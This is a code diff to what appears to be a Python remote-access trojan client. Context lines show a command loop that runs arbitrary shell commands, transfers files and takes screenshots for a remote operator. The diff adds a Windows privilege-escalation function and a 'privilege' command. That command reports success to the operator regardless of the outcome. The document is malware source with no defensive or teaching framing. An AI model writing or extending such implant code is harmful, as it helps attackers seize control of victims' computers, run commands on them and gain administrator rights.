@@ -75,6 +75,15 @@ def is_admin():
     except:
         return False
 
+def elevate_privilege():
+    if platform == 'win32':
+        privilege.priv()
+        return True
+    else:
+        print("Elevating privilege on Linux/Mac is not supported")
+        return False
+        
+
 def handle_file_transfer(command_data):
     try:
         if command_data['command'] == 'upload':
@@ -253,6 +262,11 @@ def shell():
                 print("[*] Taking screenshot...")
                 response = handle_screenshot()
                 # reliable_send(response)
+            
+            elif command == 'privilege':
+                print("[*] Elevating privilege...")
+                response = elevate_privilege()
+                reliable_send("Successfully elevated privilege")
             else:
                 print(f"[*] Executing: {command}")
                 proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
